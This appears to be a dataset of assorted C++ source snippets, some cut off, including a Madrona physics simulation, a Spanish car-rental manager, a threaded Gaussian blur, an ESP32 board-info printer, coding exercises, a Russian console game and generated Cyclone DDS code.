    "#include <algorithm>\n#include <madrona/mw_gpu_entry.hpp>\n\n#include \"sim.hpp\"\n#include \"consts.hpp\"\n\n#ifdef MADRONA_GPU_MODE\n#include <madrona/mw_gpu/host_print.hpp>\n#define LOG(...) mwGPU::HostPrint::log(__VA_ARGS__)\n#else\n#define LOG(...)\n#endif\n\nusing namespace madrona;\nusing namespace madrona::math;\nusing namespace madrona::phys;\n\nnamespace RenderingSystem = madrona::render::RenderingSystem;\n// namespace PhysicsSystem = madrona::phys::PhysicsSystem;\n\nnamespace madPhysics {\n\nconstexpr inline CountT numPhysicsSubsteps = 1;\nconstexpr inline auto physicsSolverSelector = PhysicsSystem::Solver::Convex;\n\n// Register all the ECS components and archetypes that will be\n// used in the simulation\nvoid Sim::registerTypes(ECSRegistry &registry, const Config &cfg)\n{\n    base::registerTypes(registry);\n\n    PhysicsSystem::registerTypes(registry, physicsSolverSelector);\n    RenderingSystem::registerTypes(registry, cfg.renderBridge);\n\n    registry.registerArchetype<DynamicObject>();\n}\n\n#define DYNAMIC_MOVEMENT\n\n#ifdef MADRONA_GPU_MODE\ntemplate <typename ArchetypeT>\nTaskGraph::NodeID queueSortByWorld(TaskGraph::Builder &builder,\n                                   Span<const TaskGraph::NodeID> deps)\n{\n    auto sort_sys =\n        builder.addToGraph<SortArchetypeNode<ArchetypeT, WorldID>>(\n            deps);\n    auto post_sort_reset_tmp =\n        builder.addToGraph<ResetTmpAllocNode>({sort_sys});\n\n    return post_sort_reset_tmp;\n}\n#endif\n\nstatic void setupStepTasks(TaskGraphBuilder &builder, \n                           const Sim::Config &cfg)\n{\n    (void)cfg;\n\n#if 1\n    auto broadphase_setup_sys = phys::PhysicsSystem::setupBroadphaseTasks(\n            builder, {});\n\n    auto substep_sys = PhysicsSystem::setupPhysicsStepTasks(builder,\n        {broadphase_setup_sys}, numPhysicsSubsteps, physicsSolverSelector);\n\n    auto physics_cleanup = phys::PhysicsSystem::setupCleanupTasks(\n        builder, {substep_sys});\n#endif\n\n    // For now the step does nothing but just setup the rendering tasks\n    // for the visualizer.\n    auto render_sys = RenderingSystem::setupTasks(builder, {physics_cleanup});\n\n    (void)render_sys;\n}\n\n// Build the task graph\nvoid Sim::setupTasks(TaskGraphManager &taskgraph_mgr, const Config &cfg)\n{\n    setupStepTasks(taskgraph_mgr.init(TaskGraphID::Step), cfg);\n}\n\nstatic Entity makeDynObject(Engine &ctx,\n                            Vector3 pos,\n                            Quat rot,\n                            Diag3x3 scale,\n                            ResponseType type,\n                            SimObject obj,\n                            uint32_t num_dofs)\n{\n    Entity e = ctx.makeRenderableEntity<DynamicObject>();\n    ctx.get<Position>(e) = pos;\n    ctx.get<Rotation>(e) = rot.normalize();\n    ctx.get<Scale>(e) = scale;\n    ObjectID e_obj_id = ObjectID { (int32_t)obj };\n    ctx.get<ObjectID>(e) = e_obj_id;\n\n    ctx.get<phys::broadphase::LeafID>(e) =\n        PhysicsSystem::registerEntity(ctx, e, e_obj_id,\n                                      num_dofs,\n                                      physicsSolverSelector);\n\n    ctx.get<Velocity>(e) = {\n        Vector3::zero(),\n        Vector3::zero(),\n    };\n    ctx.get<ResponseType>(e) = type;\n    ctx.get<ExternalForce>(e) = Vector3::zero();\n    ctx.get<ExternalTorque>(e) = Vector3::zero();\n\n    return e;\n}\n\nSim::Sim(Engine &ctx,\n         const Config &cfg,\n         const WorldInit &)\n    : WorldBase(ctx)\n{\n    ctx.data().initRandKey = cfg.initRandKey;\n    ctx.data().rng = RNG(rand::split_i(ctx.data().initRandKey,\n        0, (uint32_t)ctx.worldID().idx));\n\n    PhysicsSystem::init(ctx, cfg.rigidBodyObjMgr,\n                        consts::deltaT, 1,\n                        -9.8f * math::up, 100,\n                        physicsSolverSelector,\n                        cfg.cvxSolve);\n    RenderingSystem::init(ctx, cfg.renderBridge);\n\n    { // Make the articulated sticks\n        stickParent = makeDynObject(ctx,\n                              Vector3{ 0.f, 0.f, 40.01f },\n                              Quat::angleAxis(0.5f, { 1.f, 1.f, 1.f }),\n                              Diag3x3{ 1.f, 1.f, 1.f },\n                              ResponseType::Dynamic,\n                              SimObject::Stick,\n                              6);\n\n        stickChild = makeDynObject(ctx,\n                              Vector3{ 0.f, 0.f, 40.01f },\n                              Quat::angleAxis(0.5f, { 1.f, 1.f, 1.f }),\n                              Diag3x3{ 1.f, 1.f, 1.f },\n                              ResponseType::Dynamic,\n                              SimObject::Stick,\n                              1);\n\n        phys::PhysicsSystem::setEntityParentHinge(ctx,\n                                   stickParent,\n                                   stickChild,\n                                   Vector3 { 0.f, 0.f, 15.f },\n                                   Vector3 { 0.f, 0.f, 15.f },\n                                   Vector3 { 1.f, 0.f, 0.f },\n                                   physicsSolverSelector);\n    ",
    "//\n// Created by fjavi on 13/10/2024.\n//\n\n#include \"ReanelCar.h\"\n\nvoid ReanelCar::cargarCoches(const std::string& filename) {\n    std::ifstream file(filename);\n    if (!file.is_open()) {\n        std::cerr << \"Error al abrir el archivo de coches: \" << filename << std::endl;\n        return;\n    }\n\n    std::string line;\n    while (std::getline(file, line)) {\n        if (line.empty()) {\n            continue;\n        }\n\n        std::istringstream ss(line);\n        std::string matricula, marca, modelo;\n\n        std::getline(ss, matricula, ',');\n        std::getline(ss, marca, ',');\n        std::getline(ss, modelo, ',');\n\n        if (matricula.empty() || marca.empty() || modelo.empty()) {\n            std::cerr << \"Error: Fila con formato incorrecto: \" << line << std::endl;\n            continue;\n        }\n\n        coches.insertar(new Coche(matricula, marca, modelo));\n    }\n\n    file.close();\n    std::cout << \"Coches cargados correctamente.\" << std::endl;\n}\n\nvoid ReanelCar::cargarUsuarios(const std::string& filename) {\n    std::ifstream file(filename);\n    if (!file.is_open()) {\n        std::cerr << \"Error al abrir el archivo de usuarios: \" << filename << std::endl;\n        return;\n    }\n\n    std::string line;\n    while (std::getline(file, line)) {\n        if (line.empty()) {\n            continue;\n        }\n\n        std::istringstream ss(line);\n        std::string dni, contrasena, nombre, direccion;\n\n        std::getline(ss, dni, ',');\n        std::getline(ss, contrasena, ',');\n        std::getline(ss, nombre, ',');\n        std::getline(ss, direccion, ',');\n\n        if (dni.empty() || contrasena.empty() || nombre.empty() || direccion.empty()) {\n            std::cerr << \"Error: Fila con formato incorrecto: \" << line << std::endl;\n            continue; // Saltar filas mal formateadas\n        }\n\n        Usuario nuevoUsuario(dni, contrasena, nombre, direccion);\n        usuarios.insertarFin(nuevoUsuario);\n    }\n\n    file.close();\n\n    std::cout << \"Usuarios cargados correctamente.\" << std::endl;\n}\n\nUsuario* ReanelCar::buscarUsrNif(const std::string& nif) {\n    Iterador<Usuario> it = usuarios.iterador();\n    while (it.haySiguiente()) {\n        Usuario& user = it.dato();\n        it.siguiente();\n        if (user.getDNI() == nif) {\n            return &user;\n        }\n    }\n    return nullptr;\n}\n\n/**\n * @brief Buscar usuarios por parte de su nombre\n * @param substring Subcadena a buscar en el nombre de los usuarios.\n * @return Lista de usuarios que contienen la subcadena en su nombre.\n */\nListaDEnlazada<Usuario> ReanelCar::buscarUsrNomb(const std::string& substring) {\n    ListaDEnlazada<Usuario> resultados;\n    Iterador<Usuario> it = usuarios.iterador();\n    while (it.haySiguiente()) {\n        Usuario& user = it.dato();\n        it.siguiente();\n        if (user.getNombre().find(substring) == 0) {\n            resultados.insertarFin(user);\n        }\n    }\n\n    return resultados;\n}\n\n/**\n * @brief Buscar coche por matr\u00edcula\n * @param matricula Matr\u00edcula del coche a buscar.\n * @return Puntero al coche encontrado, o nullptr si no existe.\n */\nCoche* ReanelCar::buscarCochMat(const std::string& matricula) {\n    for (int i = 0; i < coches.tamlog(); i++) {\n        if (coches[i]->getId() == matricula) {\n            return coches[i];\n        }\n    }\n    return nullptr;\n}\n\n/**\n * @brief Buscar coches por modelo\n * @param modelo Modelo que queremos buscar.\n * @return Un vector din\u00e1mico con los coches cuyo modelo coincide.\n */\nVDinamico<Coche*> ReanelCar::buscarCochModelo(const std::string &modelo) {\n    VDinamico<Coche*> cochesEncontrados;\n\n    for (int i = 0; i < coches.tamlog(); ++i) {\n        Coche* coche = coches[i];\n        if (coche->getModelo() == modelo && !coche->getAlquilado()) {\n            cochesEncontrados.insertar(coche);\n        }\n    }\n\n    return cochesEncontrados;\n}\n\n/**\n * @brief Alquila un coche al usuario especificado.\n * @param usuario Usuario que alquila el coche.\n * @param coche Coche a alquilar.\n * @return true si el alquiler se realiza con \u00e9xito, false si ya est\u00e1 alquilado.\n */\nbool ReanelCar::alquilar(Usuario &usuario, Coche &coche) {\n    if (coche.getAlquilado()) {\n        std::cout << \"El coche \" << coche.getId() << \" ya est\u00e1 alquilado.\" << std::endl;\n        return false;\n    }\n    usuario.setCoche(&coche);\n    coche.setAlquilado(true);\n\n    std::cout << \"Coche \" << coche.getId() << \" alquilado a \" << usuario.getNombre() << \".\" << std::endl;\n    return true;\n}\n\n/**\n * @brief Busca coches por modelo utilizando b\u00fasqueda binaria.\n * @param modelo Modelo que queremos buscar.\n * @return Un vector din\u00e1mico con los coches cuyo modelo coincide.\n */\nVDinamico<Coche*> ReanelCar::buscarCochModeloBinario(const std::string& modelo) {\n    coches.ordenar();\n    int indice = coches.busquedabinaria(modelo);\n    VDinamico<Coche*> cochesEncontrados;\n\n    if (indice != -1) {\n        int izquierda = indice;\n        while (izquierda >= 0 && coches[izquierda]->getModelo() == modelo) {\n            cochesEncontrados.insertar(coches[izqu",
    "#include <windows.h>\n#include <string>\n#include <iostream>\n#include <chrono>\n#include <vector>\n#include <cmath>\n#include \"Bitmap.h\"\n\nstruct Squares\n{\n    Bitmap* in;\n    uint32_t startWidth;\n    uint32_t endWidth;\n    uint32_t startHeight;\n    uint32_t endHeight;\n    int kernelSize;\n};\n\nstd::vector<std::vector<double>> GenerateGaussianKernel(int size, double sigma)\n{\n    std::vector<std::vector<double>> kernel(size, std::vector<double>(size));\n    double sum = 0.0;\n\n    for (int i = 0; i < size; ++i)\n    {\n        for (int j = 0; j < size; ++j)\n        {\n            int x = i - size / 2;\n            int y = j - size / 2;\n            kernel[i][j] = exp(-(x * x + y * y) / (2 * sigma * sigma));\n            sum += kernel[i][j];\n        }\n    }\n\n    for (int i = 0; i < size; ++i)\n    {\n        for (int j = 0; j < size; ++j)\n        {\n            kernel[i][j] /= sum;\n        }\n    }\n\n    return kernel;\n}\n\nvoid GaussianBlur(Bitmap* in, uint32_t startWidth, uint32_t endWidth, uint32_t startHeight, uint32_t endHeight, int kernelSize)\n{\n    for (int i = 0; i < 15; i++)\n    {\n        double sigma = 1.0;\n        std::vector<std::vector<double>> kernel = GenerateGaussianKernel(kernelSize, sigma);\n\n        for (uint32_t y = startHeight; y < endHeight; ++y)\n        {\n            for (uint32_t x = startWidth; x < endWidth; ++x)\n            {\n                double r = 0, g = 0, b = 0;\n                double weightSum = 0;\n\n                for (int ky = 0; ky < kernelSize; ++ky)\n                {\n                    for (int kx = 0; kx < kernelSize; ++kx)\n                    {\n                        int px = x + kx - kernelSize / 2;\n                        int py = y + ky - kernelSize / 2;\n\n                        if (px >= 0 && px < in->GetWidth() && py >= 0 && py < in->GetHeight())\n                        {\n                            rgb32* pixel = in->GetPixel(px, py);\n                            double weight = kernel[ky][kx];\n                            r += pixel->r * weight;\n                            g += pixel->g * weight;\n                            b += pixel->b * weight;\n                            weightSum += weight;\n                        }\n                    }\n                }\n\n                rgb32 newPixel;\n                newPixel.r = static_cast<uint8_t>(r / weightSum);\n                newPixel.g = static_cast<uint8_t>(g / weightSum);\n                newPixel.b = static_cast<uint8_t>(b / weightSum);\n                newPixel.a = 255;\n\n                in->SetPixel(&newPixel, x, y);\n            }\n        }\n    }\n}\n\nDWORD WINAPI ThreadProc(CONST LPVOID lpParam)\n{\n    Squares* squares = (Squares*)lpParam;\n    GaussianBlur(squares->in, squares->startWidth, squares->endWidth, squares->startHeight, squares->endHeight, squares->kernelSize);\n    ExitThread(0);\n}\n\nvoid StartThreads(Bitmap* in, int numThreads, int numCores)\n{\n    int sideHeight = in->GetHeight() / numThreads;\n    int remainingHeight = in->GetHeight() % numThreads;\n\n    int sideWidth = in->GetWidth() / numThreads;\n    int remainingWidth = in->GetWidth() % numThreads;\n\n    std::vector<Squares> arrSquares;\n    for (int i = 0; i < numThreads; i++)\n    {\n        for (int j = 0; j < numThreads; j++)\n        {\n            Squares square;\n            square.in = in;\n            square.startWidth = sideWidth * j;\n            square.endWidth = sideWidth * (j + 1) + ((j == numThreads - 1) ? remainingWidth : 0);\n            square.startHeight = sideHeight * i;\n            square.endHeight = sideHeight * (i + 1) + ((i == numThreads - 1) ? remainingHeight : 0);\n            square.kernelSize = numThreads;\n            arrSquares.push_back(square);\n        }\n    }\n\n    HANDLE* handles = new HANDLE[numThreads * numThreads];\n    for (int i = 0; i < numThreads * numThreads; i++)\n    {\n        handles[i] = CreateThread(NULL, 0, &ThreadProc, &arrSquares[i], CREATE_SUSPENDED, NULL);\n        SetThreadAffinityMask(handles[i], (1 << numCores) - 1);\n    }\n\n    for (int i = 0; i < numThreads * numThreads; i++)\n    {\n        ResumeThread(handles[i]);\n    }\n\n    WaitForMultipleObjects(numThreads * numThreads, handles, true, INFINITE);\n\n    delete[] handles;\n}\n\nint main(int argc, char* argv[])\n{\n    if (argc != 5)\n    {\n        std::cerr << \"Usage: \" << argv[0] << \" <input.bmp> <output.bmp> <numThreads> <numCores>\" << std::endl;\n        return 1;\n    }\n\n    const char* inputFile = argv[1];\n    const char* outputFile = argv[2];\n    int numThreads = std::stoi(argv[3]);\n    int numCores = std::stoi(argv[4]);\n\n    auto start = std::chrono::high_resolution_clock::now();\n\n    Bitmap bmp(inputFile);\n    StartThreads(&bmp, numThreads, numCores);\n    bmp.Save(outputFile);\n\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double, std::milli> elapsed = end - start;\n    std::cerr << \"Time: \" << elapsed.count() << \" ms\" << std::endl;\n\n    return 0;\n}\n",
    "// utils.cpp\n#include <Arduino.h>\n#include <esp_system.h>\n\nuint32_t chipId = 0;\n\nvoid printBoardInfo() {\n    // \u83b7\u53d6\u82af\u7247 ID\n    for(int i = 0; i < 17; i += 8) {\n        chipId |= ((ESP.getEfuseMac() >> (40 - i)) & 0xff) << i;\n    }\n\n    // \u6253\u5370\u82af\u7247\u4fe1\u606f\n    Serial.printf(\"ESP32 Chip model = %s Rev %d\\n\", ESP.getChipModel(), ESP.getChipRevision());\n    Serial.printf(\"This chip has %d cores\\n\", ESP.getChipCores());\n    Serial.print(\"Chip ID: \"); Serial.println(chipId);\n\n    // \u83b7\u53d6 CPU \u9891\u7387\n    uint32_t cpuFreqMHz = ESP.getCpuFreqMHz();\n    Serial.printf(\"CPU Frequency: %u MHz\\n\", cpuFreqMHz);\n\n    // \u83b7\u53d6 SDK \u7248\u672c\n    const char* sdkVersion = esp_get_idf_version();\n    Serial.printf(\"SDK Version: %s\\n\", sdkVersion);\n\n    // \u83b7\u53d6 Flash \u5927\u5c0f\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\n    uint32_t flashSize = ESP.getFlashChipSize();\n    Serial.printf(\"Flash Size: %u bytes (%.2f MB)\\n\", flashSize, flashSize / 1048576.0);\n\n    // \u83b7\u53d6 Flash \u82af\u7247\u901f\u5ea6\n    uint32_t flashSpeed = ESP.getFlashChipSpeed();\n    Serial.printf(\"Flash Speed: %u Hz\\n\", flashSpeed);\n\n    // \u83b7\u53d6 Flash \u82af\u7247\u6a21\u5f0f\n    FlashMode_t flashMode = ESP.getFlashChipMode();\n    const char* modeStr = (flashMode == FM_QIO ? \"QIO\" : flashMode == FM_QOUT ? \"QOUT\" :\n                           flashMode == FM_DIO ? \"DIO\" : flashMode == FM_DOUT ? \"DOUT\" : \"UNKNOWN\");\n    Serial.printf(\"Flash Mode: %s\\n\", modeStr);\n\n    // \u83b7\u53d6 PSRAM \u7684\u5927\u5c0f\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\n    uint32_t psramSize = ESP.getPsramSize();\n    Serial.printf(\"PSRAM Size: %u bytes (%.2f MB)\\n\", psramSize, psramSize / 1048576.0);\n\n    // \u83b7\u53d6 PSRAM \u5269\u4f59\u5185\u5b58\n    uint32_t freePsram = ESP.getFreePsram();\n    Serial.printf(\"Free PSRAM: %u bytes (%.2f MB)\\n\", freePsram, freePsram / 1048576.0);\n\n    // \u83b7\u53d6\u603b\u5185\u5b58\n    uint32_t totalHeap = ESP.getHeapSize();\n    Serial.printf(\"Total heap: %u bytes (%.2f MB)\\n\", totalHeap, totalHeap / 1048576.0);\n\n    // \u83b7\u53d6\u5269\u4f59\u5185\u5b58\n    uint32_t freeMemory = ESP.getFreeHeap();\n    Serial.printf(\"Free Memory: %u bytes (%.2f MB)\\n\", freeMemory, freeMemory / 1048576.0);    \n}",
    "#include<bits/stdc++.h>\n#define ll long long\nusing namespace std;\nint compress(vector<char>& chars) {\n    int n=chars.size();\n    int count=0,j=0;\n    if(n==1) return chars.size();\n    string tmpa;\n    vector<char>res;\n    for(int i=0;i<n;i++)\n    {\n        char tmp=chars[i];\n        count=0;\n        while(i<n){\n            \n            if(tmp==chars[i]) {\n                count++;\n                i++;\n            }\n            else break;\n            //cout<<i<<endl;\n        }\n        i--;\n        res.push_back(tmp);\n        if(count>1)\n        {\n            tmpa=to_string(count);\n            for(auto j:tmpa) res.push_back(j);\n        }\n    }\n    chars.clear();\n    for(auto i:res){\n        chars.push_back(i);\n    }\n    return chars.size();\n}\nint main()\n{\n    ios_base::sync_with_stdio(0);\n    cin.tie(0);\n    vector<char>a;\n    int n;\n    char x;\n    cin>>n;\n    for(int i=0;i<n;i++)\n    {\n        cin>>x;\n        a.push_back(x);\n    }\n    int g=compress(a);\n    cout<<endl<<g;\n\n}\n\n\n/*\nint compress(vector<char>& chars) {\n    int n=chars.size();\n    if(n==1) return chars.size();\n    string res=\"\";\n    char tmp=chars[0];\n    int count=1;\n    for(int i=1;i<n;i++)\n    {\n        if(chars[i]==tmp) count++;\n        else\n        {\n            if(count==1)\n            {\n                res+=tmp;\n                tmp=chars[i];\n            }\n            else if(count>1)\n            {\n                res+=tmp;\n                res+=to_string(count);\n                count=1;\n                tmp=chars[i];\n            }\n            if(i==n-1) break;\n        }\n        if(i==n-1){\n            if(count==1)\n            {\n                res+=tmp;\n                tmp=chars[i];\n            }\n            else if(count>1)\n            {\n                res+=tmp;\n                res+=to_string(count);\n                count=1;\n                tmp=chars[i];\n            }\n        }\n        \n    }        \n    chars.clear();\n    for(int i=0;i<res.size();i++) chars.push_back(res[i]);\n    for(auto i:chars) cout<<i<<\" \";\n    cout<<endl<<res.size();\n    return res.size();\n}\n*/",
    "// Este arquivo funciona por si s\u00f3, mas foi desenvolvido apenas para testes, podendo ser descartado na entrega final.\n// O projeto final dever\u00e1 rodar com arquivos separados funcionando em conjunto (dominios.cpp, dominios.hpp, main.cpp, etc).\n\n#include <bits/stdc++.h> // Importa bibliotecas padr\u00e3o de C++ - iostream, vector, string, etc\nusing namespace std; // Facilita ao tornar desnecess\u00e1rio escrever std:: antes de classes padr\u00e3o do C++\n#define sws ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0); // Aguarda todo o programa rodar antes de printar qualquer coisa. Torna o programa mais r\u00e1pido\n\n// Os defines abaixo s\u00e3o para vetores e duplas (pair). Podem n\u00e3o ser necess\u00e1rios para o trabalho, mas est\u00e3o a\u00ed qualquer coisa\n//#define int long long\n#define endl \"\\n\"\n#define pii pair <int, int>\n#define mp make_pair\n#define ff first\n#define ss second\n#define vi vector <int>\n#define pb push_back\n#define all(x) x.begin(), x.end() // Para fun\u00e7\u00f5es como sort(all(x))\n\n// Fun\u00e7\u00e3o para classe Horario, Data, etc\nbool string_eh_int(string str) {\n    for (char chr : str) {\n        if (!isdigit(chr))\n            return false;\n    }\n    return true;\n}\n\n// Fun\u00e7\u00e3o para classe Horario\nbool eh_horario_valido(string horario) {\n    if (horario.size() != 5 or horario[2] != ':')\n        return false;\n\n    string str_HH = horario.substr(0, 2);\n    string str_mm = horario.substr(3, 2);\n    if (!string_eh_int(str_HH) or !string_eh_int(str_mm))\n        return false;\n\n    int HH = stoi(str_HH);\n    int mm = stoi(str_mm);\n    if (HH > 23 or mm > 59)\n        return false;\n\n    return true;\n}\n\n\n// Fun\u00e7\u00e3o para Nome\nbool eh_nome_valido(string nome) {\n    if (nome.size() > 30)\n        return false;\n    return true;\n}\n\n\nint32_t main() {\n    //sws;\n\n\n    // Teste de hor\u00e1rio:\n\n    cout << \"Defina o horario: \"  << endl;\n\n    string horario_teste;\n    cin >> horario_teste;\n\n    if (eh_horario_valido(horario_teste))\n        cout << \"Horario definido com sucesso: \" << horario_teste << endl;\n    else\n        cout << \"Formato de horario invalido. Por favor, digite o horario em formato HH:mm, entre 00:00 a 23:59.\" << endl;\n\n\n    // Teste de Nome:\n\n    cout << \"Defina o nome: \"  << endl;\n\n    string nome_teste;\n    cin >> nome_teste;\n\n    if (eh_nome_valido(nome_teste))\n        cout << \"Nome definido com sucesso: \" << nome_teste << endl;\n    else\n        cout << \"Nome invalido. Por favor, digite um nome com ate 30 letras.\";\n\n    return 0;\n}\n",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\n#include <vector>\n#include <conio.h>\n#include <stdlib.h>\n#include<locale.h>\nstruct Position {\n    double x;\n    double y;\n};\nstruct Player {\n    Position position;\n    int health;\n    int ammo;\n};\nstruct Enemy {\n    Position position;\n    int health=1;\n    char type;\n};\nstruct Platform {\n    Position position;\n};\nstruct Item {\n    Position position;\n    int type;\n};\nstruct Level {\n    Player player;\n    std::vector <Enemy> enemies;\n    std::vector <Platform> platforms;\n    std::vector <Item> items;\n    bool win = false;\n};\n\n//\u0431\u0438\u0437\u043d\u0435\u0441 \u043b\u043e\u0433\u0438\u043a\u0430\n\nvoid movePlayer(Player &player, int b) {\n    switch (b) {\n    case(230):\n        player.position.y+=1;\n        break;\n    case(228):\n        player.position.x-=1;\n        break;\n    case(235):\n        player.position.y-=1;\n        break;\n    case(162):\n        player.position.x+=1;\n        break;\n    }\n}\nvoid addPlatform(Level &level,Platform platform) {\n    level.platforms.push_back(platform);\n}\nvoid addEnemy(Level &level, Enemy enemy) {\n    level.enemies.push_back(enemy);\n}\nvoid addItem(Level& level, Item item) {\n    level.items.push_back(item);\n}\nvoid pickupItem(Level &level, Player &player, Item &item) {\n    printf(\"\u041f\u043e\u0434\u043e\u0431\u0440\u0430\u043d \u043f\u0440\u0435\u0434\u043c\u0435\u0442!\\n\");\n    switch (item.type) {\n    case(0):\n        player.health++;\n        break;\n    case(1):\n        player.ammo += 50;\n        break;\n    case(2):\n        level.win = true;\n        break;\n    }\n}\nvoid touchEnemy(Player &player, Enemy &enemy) {\n    printf(\"\u0418\u0433\u0440\u043e\u043a \u043f\u043e\u043b\u0443\u0447\u0438\u043b \u0443\u0440\u043e\u043d!\\n\");\n    player.health--;\n}\n\n//\u0432\u044b\u0432\u043e\u0434 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438\n\nvoid outPlatform(Platform &platform) {\n    printf(\"\u041f\u043e\u0437\u0438\u0446\u0438\u044f \u043f\u043b\u0430\u0442\u0444\u043e\u0440\u043c\u044b: %1.2f %1.2f\\n\", platform.position.x, platform.position.y);\n}\nvoid outItem(Item &item) {\n    printf(\"\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u043e \u043f\u0440\u0435\u0434\u043c\u0435\u0442\u0435: \");\n    printf(\"%1.2f %1.2f \", item.position.x, item.position.y);\n    printf(\"%d\\n\", item.type);  \n}\nvoid outPlayer(Player &player) {\n    printf(\"\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u043e\u0431 \u0438\u0433\u0440\u043e\u043a\u0435: \");\n    printf(\"%1.2f %1.2f \", player.position.x, player.position.y);\n    printf(\"%1d \", player.health);\n    printf(\"%3d\\n\", player.ammo);\n}\nvoid outEnemy(Enemy &enemy) {\n    printf(\"\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u043e \u0432\u0440\u0430\u0433\u0435:\\n\");\n    printf(\"%1.2f %1.2f \", enemy.position.x, enemy.position.y);\n    printf(\"%1d\", enemy.health);\n    printf(\"%1d\\n\", enemy.type);\n}\nvoid outLevel(Level &level) {\n    printf(\"\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u043e\u0431 \u0443\u0440\u043e\u0432\u043d\u0435:\\n\");\n    outPlayer(level.player);\n    for (Enemy enemy : level.enemies) {\n        outEnemy(enemy);\n    }\n    for (Platform platform : level.platforms) {\n        outPlatform(platform);\n    }\n    for (Item item : level.items) {\n        outItem(item);\n    }\n    if (level.win == true) {\n        printf(\"\u0423\u0440\u043e\u0432\u0435\u043d\u044c \u043f\u0440\u043e\u0439\u0434\u0435\u043d.\\n\");\n    }\n    else printf(\"\u0423\u0440\u043e\u0432\u0435\u043d\u044c \u043d\u0435 \u043f\u0440\u043e\u0439\u0434\u0435\u043d.\\n\");\n}\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u0438 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \n\nPlayer initPlayer(double x, double y, int health, int ammo) {\n    Player player;\n    Position position{ x,y };\n    player.position = position;\n    player.health = health;\n    player.ammo = ammo;\n    return player;\n}\nEnemy initEnemy(double x, double y, char type, int health = 1) {\n    Enemy enemy;\n    Position position{ x,y };\n    enemy.position = position;\n    enemy.type = type;\n    enemy.health = health;\n    return enemy;\n}\nPlatform initPlatform(double x, double y) {\n    Platform platform;\n    Position position{ x,y };\n    platform.position = position;\n    return platform;\n}\nItem initItem(double x, double y, int type) {\n    Item item;\n    Position position{ x,y };\n    item.position = position;\n    item.type = type;\n    return item;\n}\nLevel initLevel(Player &player, const std::vector<Enemy>& enemies, const std::vector<Platform>& platforms, const std::vector<Item>& items) {\n    Level level;\n    level.player = player;\n    level.enemies = enemies;\n    level.platforms = platforms;\n    level.items = items;\n    level.win = false;\n    return level;\n}\n\n//\u0432\u0432\u043e\u0434 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438\n\nItem writeItem() {\n    double x, y;\n    int type;\n    printf(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u043f\u0440\u0435\u0434\u043c\u0435\u0442\u0430: \");\n    while (scanf(\"%lf %lf\", &x, &y) != 2) {\n        printf(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u0432\u043e\u0434\u0430.\\n\");\n        while (getchar() != '\\n');\n    }\n    printf(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0442\u0438\u043f \u043f\u0440\u0435\u0434\u043c\u0435\u0442\u0430: \");\n    while (scanf(\"%d\", &type) != 1) {\n        printf(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u0432\u043e\u0434\u0430.\\n\");\n        while (getchar() != '\\n');\n    }\n    return initItem(x, y, type);\n}\n\nint main() {\n    setlocale(LC_ALL, \"RUS\");\n\n    //\u0442\u0435\u0441\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u0439 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u0438 \"\u0441\u0442\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438\u0445\" \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445\n    Player player = initPlayer(0, 0, 3, 50);\n    Enemy enemy = initEnemy(1.0, 1.0, 0);\n    Platform platform = initPlatform(2.0, 2.0);\n    Item item = initItem(3.0, 3.0, 1);\n    std::vector<Enemy> enemies = { enemy };\n    std::vector<Platform> platforms = { platform };\n    std::vector<Item> items = { item };\n    Level level = initLevel(player, enemies, platforms, items);\n    outLevel(level);\n\n    //\u0440\u0430\u0431\u043e\u0442\u0430 \u0441 \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u0438\u043c \u043c\u0430\u0441\u0441\u0438\u0432\u043e\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445 \u0438 \u0432\u0432\u043e\u0434 \u0441 \u043a\u043e\u043d\u0441\u043e\u043b\u0438\n    Item* itemsDyna;\n    itemsDyna = (Item*)malloc(3 * sizeof(Item));\n    for (int i = 0; i < 3; i++) {\n        *(itemsDyna + i) = writeItem();\n    }\n\n    //\u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0432\u044b\u0432\u043e\u0434\u0430 \u0438 \u0431\u0438\u0437\u043d\u0435\u0441-\u043b\u043e\u0433\u0438\u043a\u0430\n    int b = 0;\n    while (b",
    "/****************************************************************\n\n  Generated by Eclipse Cyclone DDS IDL to CXX Translator\n  File name: /home/me/h1_inspire_service.worktrees/Yxy_Dev/hand_idl/inspire_hand_ctrl.idl\n  Source: inspire_hand_ctrl.cpp\n  Cyclone DDS: v0.11.0\n\n*****************************************************************/\n#include \"inspire_hand_ctrl.hpp\"\n#include <iostream>\n// #include <org/eclipse/cyclonedds/util/ostream_operators.hpp>\nnamespace inspire\n{\n\ntemplate<typename T>\nstd::ostream& operator<<(std::ostream& os, const std::vector<T>& vec)\n{\n    os << \"[\";\n    for (size_t i = 0; i < vec.size(); ++i)\n    {\n        os << vec[i];\n        if (i != vec.size() - 1)\n        {\n            os << \", \";\n        }\n    }\n    os << \"]\";\n    return os;\n}\n\nstd::ostream& operator<<(std::ostream& os, inspire_hand_ctrl const& rhs)\n{\n  (void) rhs;\n  os << \"[\";\n  os << \"pos_set: \" << rhs.pos_set();\n  os 